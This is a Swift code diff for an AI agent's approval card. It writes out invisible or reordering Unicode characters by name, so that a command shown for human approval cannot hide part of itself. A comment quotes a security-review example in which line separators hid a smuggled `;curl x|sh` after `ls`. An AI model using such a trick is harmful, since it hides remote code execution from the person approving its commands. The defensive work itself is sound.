@@ -46,6 +46,45 @@ public enum ApprovalText {
         }
     }
 
+    /// `text` as an approval card shows it: every character that would
+    /// break a line, hide, or reorder what's drawn is written out by name
+    /// instead (`⟨U+2028⟩`), as the shell reads it as an ordinary
+    /// character. Controls other than a line break and a tab, format
+    /// characters (bidi overrides and isolates, zero-width ones, the
+    /// byte-order mark) and the line and paragraph separators. A line
+    /// break and a tab are left: the shell reads those as they look. A
+    /// carriage return isn't: it draws as a new line, and bash reads it
+    /// as part of a word (security review, 9 Nov 2026: `ls`, six U+2028
+    /// and `;curl x|sh` looked like `ls` on its own). The runner lets
+    /// only the Mac connected straight to it allow such a call
+    /// (runner/src/tools.ts, HIDES_OR_REORDERS).
+    public static func shown(_ text: String) -> String {
+        guard text.unicodeScalars.contains(where: hides) else { return text }
+        var out = ""
+        out.unicodeScalars.reserveCapacity(text.unicodeScalars.count)
+        for scalar in text.unicodeScalars {
+            if hides(scalar) {
+                out += "\u{27E8}U+" + String(format: "%04X", scalar.value) + "\u{27E9}"
+            } else {
+                out.unicodeScalars.append(scalar)
+            }
+        }
+        return out
+    }
+
+    /// The same for a card's fields, keys and values.
+    public static func shown(_ fields: [ToolPresentation.Field]) -> [ToolPresentation.Field] {
+        fields.map { ToolPresentation.Field(key: shown($0.key), value: shown($0.value)) }
+    }
+
+    private static func hides(_ scalar: Unicode.Scalar) -> Bool {
+        if scalar == "\n" || scalar == "\t" { return false }
+        switch scalar.properties.generalCategory {
+        case .control, .format, .lineSeparator, .paragraphSeparator: return true
+        default: return false
+        }
+    }
+
     /// The file a request would write or edit, if it names one.
     public static func filePath(_ request: ApprovalRequest) -> String? {
         let path = request.input["file_path"]?.stringValue ?? request.input["notebook_path"]?.stringValue ?? request.input["path"]?.stringValue
